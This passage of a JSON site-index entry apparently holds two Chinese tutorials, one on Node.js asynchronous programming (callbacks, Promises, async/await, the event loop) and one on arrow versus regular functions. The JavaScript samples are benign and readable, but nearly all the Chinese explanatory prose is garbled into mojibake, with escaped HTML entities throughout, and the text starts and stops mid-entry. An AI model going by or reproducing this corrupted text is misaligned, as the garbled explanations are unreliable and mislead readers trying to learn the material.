ä¾æ¬¡æ‰§è¡Œï¼Œä¾‹å¦‚ï¼š\n1 2 3 4 5 6  const a = 1 const b = 2 const c = a * b console.log(c) doSomething()   \rä¸€ã€å›è°ƒ ä¾‹å¦‚ï¼Œæ— æ³•çŸ¥é“ç”¨æˆ·ä½•æ—¶ä¼šå•å‡»æŒ‰é’®ã€‚å› æ­¤ï¼Œä¸º click äº‹ä»¶å®šä¹‰äº†ä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºã€‚æ­¤äº‹ä»¶å¤„ç†ç¨‹åºæ¥å—ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†åœ¨äº‹ä»¶è§¦å‘æ—¶è°ƒç”¨ï¼š\n1 2 3 4  document.getElementById(\u0026#39;button\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { //item clicked })   è¿™å°±æ˜¯æ‰€è°“çš„å›è°ƒã€‚\n1. å¤„ç†å›è°ƒä¸­çš„é”™è¯¯ ä»»ä½•å›è°ƒå‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é”™è¯¯å¯¹è±¡ï¼šé”™è¯¯ä¼˜å…ˆå›è°ƒã€‚è¿™æ˜¯ Node.js é‡‡ç”¨çš„ç­–ç•¥ã€‚\n1 2 3 4 5 6 7 8 9 10 11  fs.readFile(\u0026#39;/file.json\u0026#39;, (err, data) =\u0026gt; { if (err) { //handle error  console.log(err) return } //no errors, process data  console.log(data) })   2. å›è°ƒçš„é—®é¢˜ å›è°ƒéå¸¸é€‚åˆç®€å•çš„æƒ…å†µï¼\nç„¶è€Œï¼Œæ¯ä¸ªå›è°ƒéƒ½ä¼šå¢åŠ ä¸€å±‚åµŒå¥—ï¼Œå½“ä½ æœ‰å¾ˆå¤šå›è°ƒæ—¶ï¼Œä»£ç å¾ˆå¿«å°±ä¼šå˜å¾—å¤æ‚ï¼šï¼ˆå›è°ƒåœ°ç‹±ï¼‰\n1 2 3 4 5 6 7 8 9 10  window.addEventListener(\u0026#39;load\u0026#39;, () =\u0026gt; { document.getElementById(\u0026#39;button\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { setTimeout(() =\u0026gt; { items.forEach(item =\u0026gt; { //your code here  }) }, 2000) }) })   \räºŒã€Promises (ES6) Promise æ˜¯å¤„ç†å¼‚æ­¥ä»£ç çš„ä¸€ç§æ–¹å¼ï¼Œä¸ä¼šé™·å…¥å›è°ƒåœ°ç‹±ã€‚\n1. åˆ›å»º Promise 1 2 3 4 5 6 7 8 9 10 11 12  let done = true const isItDoneYet = new Promise((resolve, reject) =\u0026gt; { if (done) { const workDone = \u0026#39;è¿™æ˜¯æˆ‘æ„å»ºçš„ä¸œè¥¿\u0026#39; resolve(workDone) } else { const why = \u0026#39;è¿˜åœ¨åšåˆ«çš„äº‹æƒ…\u0026#39; reject(why) } })   2. æ¶ˆè´¹ Promise 1 2 3 4 5 6 7 8 9 10 11 12 13  const isItDoneYet = new Promise(/* ... as above ... */) //...  const checkIfItsDone = () =\u0026gt; { isItDoneYet .then(ok =\u0026gt; { console.log(ok) }) .catch(err =\u0026gt; { console.error(err) }) }    è¿è¡ŒcheckIfItsDone()æŒ‡å®šåœ¨isItDoneYetæ‰¿è¯ºè§£å†³ï¼ˆåœ¨thenè°ƒç”¨ä¸­ï¼‰æˆ–æ‹’ç»ï¼ˆåœ¨catchè°ƒç”¨ä¸­ï¼‰æ—¶è¦æ‰§è¡Œçš„å‡½æ•°ã€‚  3. é“¾å¼ Promise ä¸€ä¸ªæ‰¿è¯ºå¯ä»¥è¿”å›åˆ°å¦ä¸€ä¸ªæ‰¿è¯ºï¼Œåˆ›å»ºä¸€ä¸ªæ‰¿è¯ºé“¾ã€‚\né“¾å¼ promise çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯ Fetch APIï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥è·å–èµ„æºå¹¶åœ¨è·å–èµ„æºæ—¶å°†ä¸€ç³»åˆ— promise æ’é˜Ÿæ‰§è¡Œã€‚\nFetch API æ˜¯ä¸€ç§åŸºäº promise çš„æœºåˆ¶ï¼Œè°ƒç”¨fetch()ç›¸å½“äºä½¿ç”¨new Promise()ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  const status = response =\u0026gt; { if (response.status \u0026gt;= 200 \u0026amp;\u0026amp; response.status \u0026lt; 300) { return Promise.resolve(response) } return Promise.reject(new Error(response.statusText)) } const json = response =\u0026gt; response.json() fetch(\u0026#39;/todos.json\u0026#39;) .then(status) // è¯·æ³¨æ„ï¼Œstatus å‡½æ•°å®é™…ä¸Šåœ¨è¿™é‡Œè¢«è°ƒç”¨ï¼Œå¹¶ä¸”å®ƒè¿”å›ä¸€ä¸ªæ‰¿è¯º  .then(json) // åŒæ ·ï¼Œè¿™é‡Œå”¯ä¸€çš„åŒºåˆ«æ˜¯è¿™é‡Œçš„ json å‡½æ•°è¿”å›ä¸€ä¸ªç”¨ data è§£æçš„ promise  .then(data =\u0026gt; { // ...è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ data åœ¨è¿™é‡Œæ˜¾ç¤ºä¸ºåŒ¿åå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°  console.log(\u0026#39;Request succeeded with JSON response\u0026#39;, data) }) .catch(error =\u0026gt; { console.log(\u0026#39;Request failed\u0026#39;, error) })   4. å¤„ç†é”™è¯¯ 1 2 3 4 5 6 7 8 9 10 11 12 13 14  new Promise((resolve, reject) =\u0026gt; { throw new Error(\u0026#39;Error\u0026#39;) }).catch(err =\u0026gt; { console.error(err) }) // or  new Promise((resolve, reject) =\u0026gt; { reject(\u0026#39;Error\u0026#39;) }).catch(err =\u0026gt; { console.error(err) })   5. çº§è”é”™è¯¯ å¦‚æœåœ¨ catch() å†…éƒ¨å¼•å‘é”™è¯¯ï¼Œåˆ™å¯ä»¥é™„åŠ ç¬¬äºŒä¸ª catch() æ¥å¤„ç†å®ƒï¼Œä¾æ­¤ç±»æ¨ã€‚\n1 2 3 4 5 6 7 8 9 10  new Promise((resolve, reject) =\u0026gt; { throw new Error(\u0026#39;Error\u0026#39;) }) .catch(err =\u0026gt; { throw new Error(\u0026#39;Error\u0026#39;) }) .catch(err =\u0026gt; { console.error(err) })   6. åè°ƒ Promise Promise.all() å¦‚æœéœ€è¦åŒæ­¥ä¸åŒçš„ promiseï¼ŒPromise.all() å¸®åŠ©å®šä¹‰ä¸€ä¸ª promise åˆ—è¡¨ï¼Œå¹¶åœ¨å®ƒä»¬å…¨éƒ¨è§£å†³åæ‰§è¡Œä¸€äº›äº‹æƒ…ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  const f1 = fetch(\u0026#39;/something.json\u0026#39;) const f2 = fetch(\u0026#39;/something2.json\u0026#39;) Promise.all([f1, f2]) .then(res =\u0026gt; { console.log(\u0026#39;Array of results\u0026#39;, res) }) .catch(err =\u0026gt; { console.error(err) }) // or  Promise.all([f1, f2]).then(([res1, res2]) =\u0026gt; { console.log(\u0026#39;Results\u0026#39;, res1, res2) })   Promise.race() Promise.race() åœ¨æ‚¨ä¼ é€’ç»™å®ƒçš„ç¬¬ä¸€ä¸ªæ‰¿è¯ºè§£å†³ï¼ˆè§£å†³æˆ–æ‹’ç»ï¼‰æ—¶è¿è¡Œï¼Œå¹¶ä¸”å®ƒåªè¿è¡Œä¸€æ¬¡é™„åŠ çš„å›è°ƒï¼Œç¬¬ä¸€ä¸ªæ‰¿è¯ºçš„ç»“æœå¾—åˆ°è§£å†³ã€‚\n1 2 3 4 5 6 7 8 9 10 11  const first = new Promise((resolve, reject) =\u0026gt; { setTimeout(resolve, 500, \u0026#39;first\u0026#39;) }) const second = new Promise((resolve, reject) =\u0026gt; { setTimeout(resolve, 100, \u0026#39;second\u0026#39;) }) Promise.race([first, second]).then(result =\u0026gt; { console.log(result) // second })   Promise.any() Promise.any() åœ¨æ‚¨ä¼ é€’ç»™å®ƒçš„ä»»ä½•æ‰¿è¯ºå®ç°æˆ–æ‰€æœ‰æ‰¿è¯ºè¢«æ‹’ç»æ—¶è§£å†³ã€‚ å®ƒè¿”å›ä¸€ä¸ªå•ä¸€çš„æ‰¿è¯ºï¼Œè¯¥æ‰¿è¯ºä»¥ç¬¬ä¸€ä¸ªå·²å±¥è¡Œçš„æ‰¿è¯ºä¸­çš„å€¼è¿›è¡Œè§£æã€‚ å¦‚æœæ‰€æœ‰ Promise éƒ½è¢«æ‹’ç»ï¼Œåˆ™è¿”å›çš„ Promise å°†è¢«æ‹’ç»å¹¶å¸¦æœ‰ AggregateErrorã€‚\n1 2 3 4 5 6 7 8 9 10 11  const first = new Promise((resolve, reject) =\u0026gt; { setTimeout(reject, 500, \u0026#39;first\u0026#39;) }) const second = new Promise((resolve, reject) =\u0026gt; { setTimeout(reject, 100, \u0026#39;second\u0026#39;) }) Promise.any([first, second]).catch(error =\u0026gt; { console.log(error) // AggregateError })   7. å¸¸è§é”™è¯¯ æœªæ•è·çš„ç±»å‹é”™è¯¯ Uncaught TypeError: undefined is not a promise\nå¦‚æœåœ¨æ§åˆ¶å°ä¸­æ”¶åˆ° Uncaught TypeError: undefined is not a promise é”™è¯¯ï¼Œè¯·ç¡®ä¿ä½¿ç”¨ new Promise() è€Œä¸æ˜¯ Promise()ã€‚\næœªå¤„ç†çš„æ‰¿è¯ºæ‹’ç»è­¦å‘Š UnhandledPromiseRejectionWarning\nè¿™æ„å‘³ç€è°ƒç”¨çš„æ‰¿è¯ºè¢«æ‹’ç»ï¼Œä½†æ²¡æœ‰ç”¨äºå¤„ç†é”™è¯¯çš„æ•è·ã€‚ æ·»åŠ ä¸€ä¸ª catch æ•è· ç„¶åæ­£ç¡®å¤„ç†å®ƒã€‚\n\rä¸‰ã€async/await (ES2017) Promise æ˜¯ä¸ºäº†è§£å†³è‘—åçš„å›è°ƒåœ°ç‹±é—®é¢˜è€Œå¼•å…¥çš„ï¼Œä½†å®ƒä»¬è‡ªèº«ä¹Ÿå¼•å…¥äº†å¤æ‚æ€§å’Œè¯­æ³•å¤æ‚æ€§ã€‚\nasync/await æ˜¯å»ºç«‹åœ¨ promises ä¹‹ä¸Šçš„ï¼Œç”¨äºè§£å†³è¿™ç§å¤æ‚æ€§ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // Promise const aFunction = () =\u0026gt; { return Promise.resolve(\u0026#39;test\u0026#39;) } aFunction().then(alert) // This will alert \u0026#39;test\u0026#39;  // async const aFunction = async () =\u0026gt; { return \u0026#39;test\u0026#39; } aFunction().then(alert) // This will alert \u0026#39;test\u0026#39;   æ›´å¤æ‚çš„ä¾‹å­(å¤šä¸ªå¼‚æ­¥å‡½æ•°ä¸²è”)ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  const promiseToDoSomething = () =\u0026gt; { return new Promise(resolve =\u0026gt; { setTimeout(() =\u0026gt; resolve(\u0026#39;I did something\u0026#39;), 10000) }) } const watchOverSomeoneDoingSomething = async () =\u0026gt; { const something = await promiseToDoSomething() return something + \u0026#39;\\nand I watched\u0026#39; } const watchOverSomeoneWatchingSomeoneDoingSomething = async () =\u0026gt; { const something = await watchOverSomeoneDoingSomething() return something + \u0026#39;\\nand I watched as well\u0026#39; } watchOverSomeoneWatchingSomeoneDoingSomething().then(res =\u0026gt; { console.log(res) }) // I did something // and I watched // and I watched as well   \rå››ã€äº‹ä»¶å¾ªç¯ 1. é‡è¦æ€§ äº‹ä»¶å¾ªç¯æ˜¯äº†è§£ Node.js çš„æœ€é‡è¦æ–¹é¢ä¹‹ä¸€ã€‚\nå®ƒè§£é‡Šäº† Node.js å¦‚ä½•å¯ä»¥æ˜¯å¼‚æ­¥çš„å¹¶ä¸”å…·æœ‰éé˜»å¡ I/Oï¼Œæ‰€ä»¥å®ƒåŸºæœ¬ä¸Šè§£é‡Šäº† Node.js ä½œä¸º â€œæ€æ‰‹çº§åº”ç”¨ç¨‹åºâ€ ä¸ºä½•å¦‚æ­¤æˆåŠŸã€‚\nNode.js JavaScript ä»£ç åœ¨å•çº¿ç¨‹ä¸Šè¿è¡Œã€‚ä¸€æ¬¡åªå‘ç”Ÿä¸€ä»¶äº‹ã€‚\nè¿™æ˜¯ä¸€ä¸ªå®é™…ä¸Šéå¸¸æœ‰ç”¨çš„é™åˆ¶ï¼Œå› ä¸ºå®ƒå¤§å¤§ç®€åŒ–äº†ç¼–ç¨‹æ–¹å¼ï¼Œè€Œæ— éœ€æ‹…å¿ƒå¹¶å‘é—®é¢˜ã€‚\nåªéœ€è¦æ³¨æ„å¦‚ä½•ç¼–å†™ä»£ç å¹¶é¿å…ä»»ä½•å¯èƒ½é˜»å¡çº¿ç¨‹çš„äº‹æƒ…ï¼Œä¾‹å¦‚åŒæ­¥ç½‘ç»œè°ƒç”¨æˆ–æ— é™å¾ªç¯ã€‚\n2. æ¡ˆä¾‹ ä¸¾ä¾‹æ¥è¯´ï¼Œåœ¨å¤§å¤šæ•°æµè§ˆå™¨ä¸­ï¼Œæ¯ä¸ªæµè§ˆå™¨é€‰é¡¹å¡éƒ½æœ‰ä¸€ä¸ªäº‹ä»¶å¾ªç¯ï¼Œä½¿æ¯ä¸ªè¿›ç¨‹éš”ç¦»ï¼Œé¿å…ç½‘é¡µæ— é™å¾ªç¯æˆ–ç¹é‡çš„å¤„ç†æ¥é˜»å¡æ•´ä¸ªæµè§ˆå™¨ã€‚\nè¯¥ç¯å¢ƒç®¡ç†å¤šä¸ªå¹¶å‘äº‹ä»¶å¾ªç¯ï¼Œä¾‹å¦‚å¤„ç† API è°ƒç”¨ã€‚ Web Workers ä¹Ÿè¿è¡Œåœ¨ä»–ä»¬è‡ªå·±çš„äº‹ä»¶å¾ªç¯ä¸­ã€‚\nä¸»è¦éœ€è¦æ‹…å¿ƒä»£ç å°†åœ¨å•ä¸ªäº‹ä»¶å¾ªç¯ä¸Šè¿è¡Œï¼Œå¹¶åœ¨ç¼–å†™ä»£ç æ—¶è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œä»¥é¿å…é˜»å¡å®ƒã€‚\n3. é˜»å¡äº‹ä»¶å¾ªç¯ ä»»ä½•éœ€è¦å¤ªé•¿æ—¶é—´å°†æ§åˆ¶æƒè¿”å›ç»™äº‹ä»¶å¾ªç¯çš„ JavaScript ä»£ç éƒ½ä¼šé˜»å¡é¡µé¢ä¸­ä»»ä½• JavaScript ä»£ç çš„æ‰§è¡Œï¼Œç”šè‡³é˜»å¡ UI çº¿ç¨‹ï¼Œå¹¶ä¸”ç”¨æˆ·æ— æ³•å››å¤„ç‚¹å‡»ã€æ»šåŠ¨é¡µé¢ç­‰ã€‚\nJavaScript ä¸­å‡ ä¹æ‰€æœ‰çš„ I/O åŸè¯­éƒ½æ˜¯éé˜»å¡çš„ã€‚\nç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶ç³»ç»Ÿæ“ä½œç­‰ é˜»å¡æ˜¯ä¸€ä¸ªä¾‹å¤–ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ JavaScript å¦‚æ­¤å¤šåœ°åŸºäºå›è°ƒï¼Œæœ€è¿‘åˆæœ‰äº† promise å’Œ async/awaitã€‚\n4. è°ƒç”¨æ ˆ è°ƒç”¨å †æ ˆæ˜¯ä¸€ä¸ª LIFOï¼ˆåè¿›å…ˆå‡ºï¼‰å †æ ˆã€‚\näº‹ä»¶å¾ªç¯ä¸æ–­æ£€æŸ¥è°ƒç”¨å †æ ˆä»¥æŸ¥çœ‹æ˜¯å¦æœ‰ä»»ä½•å‡½æ•°éœ€è¦è¿è¡Œã€‚\nè¿™æ ·åšæ—¶ï¼Œå®ƒä¼šæ‰¾åˆ°çš„ä»»ä½•å‡½æ•°è°ƒç”¨æ·»åŠ åˆ°è°ƒç”¨å †æ ˆä¸­ï¼Œå¹¶æŒ‰é¡ºåºæ‰§è¡Œæ¯ä¸ªè°ƒç”¨ã€‚\næ‚¨çŸ¥é“è°ƒè¯•å™¨æˆ–æµè§ˆå™¨æ§åˆ¶å°ä¸­æ‚¨å¯èƒ½ç†Ÿæ‚‰çš„é”™è¯¯å †æ ˆè·Ÿè¸ªå—ï¼Ÿ æµè§ˆå™¨åœ¨è°ƒç”¨å †æ ˆä¸­æŸ¥æ‰¾å‡½æ•°åç§°ä»¥é€šçŸ¥æ‚¨å“ªä¸ªå‡½æ•°å‘èµ·å½“å‰è°ƒç”¨ï¼š\n5. äº‹ä»¶å¾ªç¯è§£é‡Š 1 2 3 4 5 6 7 8 9 10 11 12  const bar = () =\u0026gt; console.log(\u0026#39;bar\u0026#39;) const baz = () =\u0026gt; console.log(\u0026#39;baz\u0026#39;) const foo = () =\u0026gt; { console.log(\u0026#39;foo\u0026#39;) bar() baz() } foo()   å½“æ­¤ä»£ç è¿è¡Œæ—¶ï¼Œé¦–å…ˆè°ƒç”¨ foo()ã€‚ åœ¨ foo() ä¸­ï¼Œé¦–å…ˆè°ƒç”¨ bar()ï¼Œç„¶åè°ƒç”¨ baz()ã€‚\næ¯æ¬¡è¿­ä»£çš„äº‹ä»¶å¾ªç¯éƒ½ä¼šæŸ¥çœ‹è°ƒç”¨å †æ ˆä¸­æ˜¯å¦æœ‰å†…å®¹ï¼Œå¹¶æ‰§è¡Œå®ƒï¼š\nç›´åˆ°è°ƒç”¨æ ˆä¸ºç©ºã€‚\n1). æ’é˜ŸåŠŸèƒ½æ‰§è¡Œ ä¸Šé¢çš„ä¾‹å­çœ‹èµ·æ¥å¾ˆæ­£å¸¸ï¼Œæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„ï¼šJavaScript æ‰¾åˆ°è¦æ‰§è¡Œçš„ä¸œè¥¿ï¼ŒæŒ‰é¡ºåºè¿è¡Œå®ƒä»¬ã€‚\nè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•å°†å‡½æ•°æ¨è¿Ÿåˆ°å †æ ˆæ¸…é™¤ä¸ºæ­¢ã€‚\nsetTimeout(() =\u0026gt; {}, 0) çš„ç”¨ä¾‹æ˜¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ¯ä¸ªå‡½æ•°éƒ½æ‰§è¡Œä¸€æ¬¡ã€‚\nä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  const bar = () =\u0026gt; console.log(\u0026#39;bar\u0026#39;) const baz = () =\u0026gt; console.log(\u0026#39;baz\u0026#39;) const foo = () =\u0026gt; { console.log(\u0026#39;foo\u0026#39;) setTimeout(bar, 0) baz() } foo() // foo // baz // bar   å½“æ­¤ä»£ç è¿è¡Œæ—¶ï¼Œé¦–å…ˆè°ƒç”¨ foo()ã€‚ åœ¨ foo() ä¸­ï¼Œé¦–å…ˆè°ƒç”¨ setTimeoutï¼Œå°† bar ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œç„¶åæŒ‡ç¤ºå®ƒå°½å¯èƒ½å¿«åœ°ç«‹å³è¿è¡Œï¼Œå°† 0 ä½œä¸ºè®¡æ—¶å™¨ä¼ é€’ã€‚ ç„¶åè°ƒç”¨ baz()ã€‚\næ­¤æ—¶è°ƒç”¨å †æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼š\nè¿™æ˜¯ç¨‹åºä¸­æ‰€æœ‰å‡½æ•°çš„æ‰§è¡Œé¡ºåºï¼š\nä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ\n2). æ¶ˆæ¯é˜Ÿåˆ— å½“ setTimeout() è¢«è°ƒç”¨æ—¶ï¼Œæµè§ˆå™¨æˆ– Node.js å¯åŠ¨è®¡æ—¶å™¨ã€‚ ä¸€æ—¦è®¡æ—¶å™¨åˆ°æœŸï¼Œå›è°ƒå‡½æ•°è¢«æ”¾å…¥æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚\næ¶ˆæ¯é˜Ÿåˆ—ä¹Ÿæ˜¯ç”¨æˆ·å‘èµ·çš„äº‹ä»¶ï¼ˆå¦‚å•å‡»æˆ–é”®ç›˜äº‹ä»¶ï¼‰æˆ–è·å–å“åº”åœ¨æ‚¨çš„ä»£ç æœ‰æœºä¼šå¯¹å…¶åšå‡ºååº”ä¹‹å‰æ’é˜Ÿçš„åœ°æ–¹ã€‚ æˆ–è€…è¿˜æœ‰åƒ onload è¿™æ ·çš„ DOM äº‹ä»¶ã€‚\nå¾ªç¯ä¼˜å…ˆå¤„ç†è°ƒç”¨æ ˆï¼Œå®ƒé¦–å…ˆå¤„ç†åœ¨è°ƒç”¨æ ˆä¸­æ‰¾åˆ°çš„æ‰€æœ‰ä¸œè¥¿ï¼Œä¸€æ—¦é‡Œé¢æ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼Œå®ƒå°±ä¼šå»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–ä¸œè¥¿ã€‚\nä¸å¿…ç­‰å¾… setTimeoutã€fetch æˆ–å…¶ä»–å‡½æ•°æ¥åšè‡ªå·±çš„å·¥ä½œï¼Œå› ä¸ºå®ƒä»¬æ˜¯ç”±æµè§ˆå™¨æä¾›çš„ï¼Œå¹¶ä¸”å®ƒä»¬å­˜åœ¨äºè‡ªå·±çš„çº¿ç¨‹ä¸­ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœå°† setTimeout è¶…æ—¶è®¾ç½®ä¸º 2 ç§’ï¼Œåˆ™ä¸å¿…ç­‰å¾… 2 ç§’ - ç­‰å¾…å‘ç”Ÿåœ¨å…¶ä»–åœ°æ–¹ã€‚\n6. ES6 ä½œä¸šé˜Ÿåˆ— ECMAScript 2015 å¼•å…¥äº† Job Queue çš„æ¦‚å¿µï¼Œå®ƒè¢« Promises ä½¿ç”¨ï¼ˆä¹Ÿåœ¨ ES6/ES2015 ä¸­å¼•å…¥ï¼‰ã€‚ è¿™æ˜¯ä¸€ç§å°½å¿«æ‰§è¡Œå¼‚æ­¥å‡½æ•°ç»“æœçš„æ–¹æ³•ï¼Œè€Œä¸æ˜¯æ”¾åœ¨è°ƒç”¨å †æ ˆçš„æœ«å°¾ã€‚\nåœ¨å½“å‰å‡½æ•°ç»“æŸä¹‹å‰è§£æçš„ Promise å°†åœ¨å½“å‰å‡½æ•°ä¹‹åç«‹å³æ‰§è¡Œã€‚\nä¾‹å¦‚ï¼Œåœ¨æ¸¸ä¹å›­åè¿‡å±±è½¦ï¼š\næ¶ˆæ¯é˜Ÿåˆ—æŠŠä½ æ”¾åœ¨é˜Ÿåˆ—çš„åé¢ï¼Œåœ¨æ‰€æœ‰å…¶ä»–äººçš„åé¢ï¼Œä½ å¿…é¡»åœ¨é‚£é‡Œç­‰å¾…è½®åˆ°ä½ ï¼Œ\nè€Œä½œä¸šé˜Ÿåˆ—æ˜¯å¿«é€Ÿé€šè¡Œè¯ è¿™æ ·å°±å¯ä»¥åœ¨å®Œæˆä¸Šä¸€æ¬¡éª‘è¡Œåç«‹å³ä¹˜åå¦ä¸€æ¬¡éª‘è¡Œã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  const bar = () =\u0026gt; console.log(\u0026#39;bar\u0026#39;) const baz = () =\u0026gt; console.log(\u0026#39;baz\u0026#39;) const foo = () =\u0026gt; { console.log(\u0026#39;foo\u0026#39;) setTimeout(bar, 0) new Promise((resolve, reject) =\u0026gt; resolve(\u0026#39;åº”è¯¥åœ¨ baz ä¹‹åï¼Œåœ¨ bar ä¹‹å‰\u0026#39;) ).then(resolve =\u0026gt; console.log(resolve)) baz() } foo() // foo // baz // åº”è¯¥åœ¨ baz ä¹‹åï¼Œåœ¨ bar ä¹‹å‰ // bar   è¿™æ˜¯ Promisesï¼ˆå’Œ Async/awaitï¼Œå®ƒå»ºç«‹åœ¨ Promise ä¹‹ä¸Šï¼‰å’Œé€šè¿‡ setTimeout() æˆ–å…¶ä»–å¹³å° API å®ç°çš„æ™®é€šå¼‚æ­¥å‡½æ•°ä¹‹é—´çš„å·¨å¤§å·®å¼‚ã€‚\næœ€åï¼Œè¿™æ˜¯ä¸Šé¢ç¤ºä¾‹çš„è°ƒç”¨å †æ ˆçš„æ ·å­ï¼š\n","description":"Node.js åŸºäºå¼‚æ­¥ç¼–ç¨‹","id":52,"section":"nodejs","tags":null,"title":"å¼‚æ­¥ç¼–ç¨‹","uri":"https://codthing.github.io/nodejs/nodebase/node-programming/"},{"content":"JavaScript çš„ç®­å¤´å‡½æ•°ä»è¡¨é¢ä¸Šçœ‹å¯èƒ½ä¸å¸¸è§„å‡½æ•°ç›¸åŒï¼Œä½†å®ƒä»¬æœ‰ä¸€äº›éå¸¸é‡è¦çš„åŒºåˆ«ï¼š\nå…³é”®åŒºåˆ«  è¯­æ³• this å€¼ï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ ç”¨ä½œç±»æ–¹æ³• ç”¨ä½œæ„é€ å‡½æ•° arguments å‚æ•°ç»‘å®š  #. è¯­æ³• 1 2 3 4 5 6 7  const square = a =\u0026gt; a * a; // å…è®¸çœç•¥å•ä¸ªå‚æ•°å‘¨å›´çš„æ‹¬å·; éšå¼è¿”å›;  // ç­‰æ•ˆå¸¸è§„function function square(a) { return a * a; }   #. æ‰§è¡Œä¸Šä¸‹æ–‡  this  1 2 3 4 5 6 7 8 9 10 11 12 13  const logThisArrow = () =\u0026gt; { console.log(this); }; document.addEventListener(\u0026#39;click\u0026#39;, logThisArrow); // `this` æŒ‡çš„æ˜¯å…¨å±€å¯¹è±¡  // å¸¸è§„å‡½æ•° function logThis() { console.log(this); } document.addEventListener(\u0026#39;click\u0026#39;, logThis); // `this` æŒ‡çš„æ˜¯ document    Function.prototype.call() Function.prototype.bind() Function.prototype.apply()  ä»¥ä¸Š3ä¸ªæ–¹æ³•ç®­å¤´å‡½æ•°ä¹Ÿä¸èƒ½å·¥ä½œã€‚å› ä¸ºè¿™ä¸‰ä¸ªæ–¹æ³•ç›®çš„å¼å…è®¸å‡½æ•°åœ¨ä¸åŒçš„èŒƒå›´å†…æ‰§è¡Œã€‚\nä½†æ˜¯ç®­å¤´å‡½æ•°çš„ this å€¼ä¸èƒ½æ”¹å˜ï¼Œå› ä¸ºå®ƒæ˜¯è¯æ³•è§£æçš„ã€‚\n1 2 3 4 5 6 7 8 9 10 11  const logThisArrow = () =\u0026gt; { console.log(this); }; logThisArrow.call(42); // Logs: å…¨å±€å¯¹è±¡  // å¸¸è§„å‡½æ•° function logThis() { console.log(this); } logThis.call(42); // Logs: 42   #. ç”¨ä½œç±»æ–¹æ³• ç”±äºç®­å¤´å‡½æ•°æ²¡æœ‰å®šä¹‰è‡ªå·±çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå› æ­¤å®ƒä»¬ä¸å¤ªé€‚åˆç”¨ä½œæ–¹æ³•ã€‚\nç„¶è€Œï¼Œç”±äºClass fields proposalï¼Œå¦‚æœæ‚¨çš„ç¯å¢ƒæ”¯æŒï¼Œç®­å¤´å‡½æ•°å¯ä»¥ç”¨ä½œç±»å†…éƒ¨çš„æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13  const obj = { x: 42, logThisX: function() { console.log(this.x, this); }, logThisXArrow: () =\u0026gt; { console.log(this.x, this); } }; obj.logThisX(); // Logs: 42, Object {...} obj.logThisXArrow(); // Logs: undefined, the global object   #. ç”¨ä½œæ„é€ å‡½æ•° å¸¸è§„å‡½æ•°å¯ä»¥ç”¨ä½œæ„é€ å‡½æ•°ï¼Œä½¿ç”¨newå…³é”®å­—ã€‚\nthiså†…éƒ¨ç®­å¤´å‡½æ•°çš„è¯æ³•è§£æçš„å¦ä¸€ä¸ªç»“æœæ˜¯å®ƒä»¬ä¸èƒ½ç”¨ä½œæ„é€ å‡½æ•°ã€‚ä½¿ç”¨newåœ¨ä¸€ä¸ªç®­å¤´ä½œç”¨çš„ç»“æœTypeErrorã€‚\n1 2 3 4 5 6 7 8 9 10  const Bar = foo =\u0026gt; { this.foo = foo; }; const b = new Bar(42); // TypeError: Bar is not a constructor  function Foo(bar) { this.bar = bar; } const a = new Foo(42); // Foo {bar: 42}   #. arguments å‚æ•°ç»‘å®š å¦ä¸€ä¸ªåŒºåˆ«æ˜¯argumentså¯¹è±¡çš„ç»‘å®šã€‚\nä¸å¸¸è§„å‡½æ•°ä¸åŒï¼Œç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„argumentså¯¹è±¡ã€‚ç»•è¿‡æ­¤é™åˆ¶çš„ç°ä»£æ›¿ä»£æ–¹æ¡ˆæ˜¯ä½¿ç”¨å…¶ä½™å‚æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  function sum() { return arguments[0] + arguments[1]; }; sum(4, 6); // 10  const arguments = [1, 2, 3]; const sumArrow = () =\u0026gt; { return arguments[0] + arguments[1]; }; sumArrow(4, 6); // 3 (resolves to 1 + 2)  const sumRest = (...arguments) =\u0026gt; { return arguments[0] + arguments[1]; } sumRest(4, 6); // 10   #. å…¶ä»–å·®å¼‚ 